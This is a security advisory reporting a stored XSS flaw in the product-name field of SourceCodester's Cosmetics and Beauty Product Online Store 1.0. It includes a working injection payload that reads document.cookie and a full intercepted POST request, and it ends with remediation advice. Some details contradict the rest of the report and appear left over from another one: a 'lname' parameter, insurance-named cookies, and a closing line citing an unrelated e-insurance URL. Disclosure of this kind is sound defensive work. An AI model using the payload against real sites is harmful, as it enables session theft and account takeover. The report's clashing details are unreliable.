Stored Cross-Site Scripting Vulnerability in SourceCodester Cosmetics and Beauty Product Online Store - 1.0
:

    Vendor: Sourcecodester
    Product: Cosmetics and Beauty Product Online Store - 1.0
    Product URL: Cosmetics and Beauty Product Online Store - 1.0

Executive Summary

Stored Cross-Site Scripting (SXSS) vulnerability in Cosmetics and Beauty Product Online Store - 1.0 and earlier allows attacker to inject the Malicious JavaScript Code in the "Product Name" input field. The malicious code can then be executed whenever the vulnerable web page is accessed by any user, staff or even admin and will remain persistent. It will eventually result in account takeover as the session cookies can be accessed by the malicious JavaScript Code.
Issue Details

    Vulnerability Name: Stored XSS in Product Name
    Severity: High
    Affected URL: http://localhost/cbpos/classes/Master.php?f=save_product 
    Affected Parameter: Product Name
    HTTP Method: POST

Issue Description

The web application is vulnerable to Cross-Site Scripting (SXSS) attacks in the "Product Name" input field. An attacker can exploit this vulnerability by inputting the malicious JavaScript code in the HTTP POST request to create the user. In the provided example, the attacker modifies the "Product Name" parameter to insert a malicious JavaScript Code that can also access the authentication cookies.
Proof Of Concept

Configure a web proxy in your browser.

Navigate to the URL in the browser http://localhost/cbpos/classes/Master.php?f=save_product 

Fill in the desired data in the input fields. Intercept the request in the web proxy. Modify the lname parameter as shown below and send the request to the server.

> Content-Disposition: form-data; name="name"
>
> "><img src=xx onerror=alert(document.cookie)>


In the browser just create an product with malicious script and navigate to homepage

https://drive.google.com/file/d/1t29u20nWeS-dk8z-xNo5VJBecWtuM8V-/view?usp=drive_link
Payload:

> Content-Disposition: form-data; name="name"
>
> "><img src=xx onerror=alert(document.cookie)>

Request:
```bash
POST /cbpos/classes/Master.php?f=save_product HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------424935362530218054633052935758
Content-Length: 1086
Origin: http://localhost
Connection: close
Referer: http://localhost/cbpos/admin/?page=product/manage_product
Cookie: PHPSESSID=kmfcp9qgvb789441h8l4ues37v; __insuarance__logged=1; __insuarance__key=DEAH5SIN6WSHVCZFXTH5
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

-----------------------------424935362530218054633052935758
Content-Disposition: form-data; name="id"


-----------------------------424935362530218054633052935758
Content-Disposition: form-data; name="brand_id"

5
-----------------------------424935362530218054633052935758
Content-Disposition: form-data; name="category_id"

7
-----------------------------424935362530218054633052935758
Content-Disposition: form-data; name="name"

"><img src=xx onerror=alert(document.cookie)>
-----------------------------424935362530218054633052935758
Content-Disposition: form-data; name="specs"

<p>hiii<br></p>
-----------------------------424935362530218054633052935758
Content-Disposition: form-data; name="files"; filename=""
Content-Type: application/octet-stream


-----------------------------424935362530218054633052935758
Content-Disposition: form-data; name="status"

1
-----------------------------424935362530218054633052935758
Content-Disposition: form-data; name="img[]"; filename=""
Content-Type: application/octet-stream


-----------------------------424935362530218054633052935758--
```
Impact:

Stored XSS attacks can have serious consequences, such as Account takeover by stealing cookies, stealing sensitive data, modifying the content of the web page, or redirecting users to a malicious sites.
Remediation:

Implement proper input validation and output encoding to prevent malicious code from being injected into the web application. Use server-side validation to ensure that user input is properly sanitized before being stored in a database or displayed on a web page. Use output encoding to ensure that any user input that is displayed on the web page is properly encoded to prevent malicious code from being executed.
References:

https://portswigger.net/web-security/cross-site-scripting/stored

https://owasp.org/www-community/attacks/xss/

Weakness Enumeration:

CWE-79

This report highlights the Stored XSS vulnerability present in the Product name parameter of http://localhost/e-insurance/Script./core/new_account, including the Proof of Concept, its impact, remediation steps and references for further guidance on mitigation strategies.
